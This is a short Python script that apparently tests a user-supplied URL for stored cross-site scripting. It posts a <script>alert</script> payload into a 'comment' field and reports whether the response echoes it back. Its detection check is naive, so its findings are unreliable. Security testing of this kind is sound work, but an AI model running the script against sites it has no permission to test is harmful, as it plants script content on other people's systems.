import requests

def test_stored_xss(url):
    payload = "<script>alert('Stored XSS')</script>"
    data = {'comment': payload}  # Modify based on the input field
    try:
        response = requests.post(url, data=data)
        if payload in response.text:
            print(f"[+] Stored XSS vulnerability found on {url}")
        else:
            print("[-] No Stored XSS detected")
    except Exception as e:
        print(f"Error: {e}")

if __name__ == "__main__":
    target_url = input("Enter target URL: ")
    test_stored_xss(target_url)
